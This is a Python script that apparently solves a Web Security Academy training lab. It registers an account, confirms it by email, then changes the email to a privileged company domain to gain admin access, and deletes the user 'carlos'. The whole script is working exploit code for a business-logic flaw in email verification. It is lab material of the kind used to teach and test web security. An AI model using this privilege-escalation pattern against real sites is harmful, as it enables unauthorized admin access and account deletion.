from web_security_academy.core.utils import print_info, print_success, print_fail
from web_security_academy.core.email_client import EmailClient
from bs4 import BeautifulSoup
import re


def solve_lab(session):
    email_client = EmailClient(session)
    email = email_client.address

    # Start registering account
    csrf = session.get_csrf_token("/register")
    print_info("Registering an account with the following data:")
    data = {
        "csrf": csrf,
        "username": "attacker",
        "email": email_client.address,
        "password": "123456",
    }
    print(data, end="\n\n")
    session.post_path("/register", data=data)

    # Finish registering account
    email_client.update_emails()
    email = email_client.emails[-1]

    print_success("Received the following email:")
    for category in ("Sent", "From", "To", "Subject"):
        print(f"{category}:".ljust(10) + email[category])
    print(f"\n{email['Body']}", end="\n\n")

    url = re.findall(r"http[\S]+", email["Body"])[0]
    print_info(f'Finish registering account by visiting "{url}"...')
    session.get(url)

    # Privilege escalation
    resp = session.login("attacker", "123456")
    csrf = session.get_csrf_token("/my-account")

    email = "attacker@dontwannacry.com"
    data = {"csrf": csrf, "email": email}
    print_info(f'Changing email to "{email}"...')
    session.post_path("/my-account/change-email", data=data)

    print_info("Deleting user carlos...")
    session.get_path("/admin/delete?username=carlos")
